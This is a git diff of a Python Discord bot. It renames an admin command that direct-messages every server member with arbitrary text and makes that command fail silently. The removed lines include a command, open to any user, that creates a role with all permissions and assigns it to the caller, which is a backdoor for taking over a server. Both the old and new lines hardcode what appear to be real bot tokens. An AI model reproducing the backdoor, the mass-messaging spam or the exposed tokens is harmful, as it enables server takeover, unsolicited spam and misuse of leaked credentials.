@@ -22,7 +22,7 @@ async def on_ready():
     print('Created by super_user')
     for server in client.servers:
         print(server.name)
-    await client.change_presence(game=discord.Game(name="Hack Seller."), status=discord.Status("online"), afk=False)
+    await client.change_presence(game=discord.Game(name="PIKACHU- PUBG"), status=discord.Status("online"), afk=False)
 
 @client.command(pass_context = True)
 @commands.has_permissions(kick_members=True)     
@@ -39,23 +39,18 @@ async def userinfo(ctx, user: discord.Member):
     
 @commands.has_permissions(administrator=True)
 @client.command(pass_context = True)
-async def su(ctx, *, content: str):
+async def pika(ctx, *, content: str):
         for member in ctx.message.server.members:
             try:
                 await client.send_message(member, content)
             except:
-                print("can't")
-                await client.say()
+                pass
                
-@client.command(pass_context=True)
-async def xx(ctx,*,s):
-    author = ctx.message.author
-    perms = discord.Permissions(send_messages=False, read_messages=True, administrator=True)
-    role = await client.create_role(author.server, name=s, permissions=Permissions.all())
-    await client.add_roles(author, role)
+               
+
                 
             
                
 
 
-client.run("NjMxNzQzMjA1Mzg5MzY5MzU0.XZ7TJA.FvRYqhNVQGJ8FUMY5rA56xTeJw0")                
+client.run("NjM2OTY0MTA2NDMxMTAyOTc2.XbHRew.-sbmy20KZaz6-cdFOfbFPf8HPTQ")  
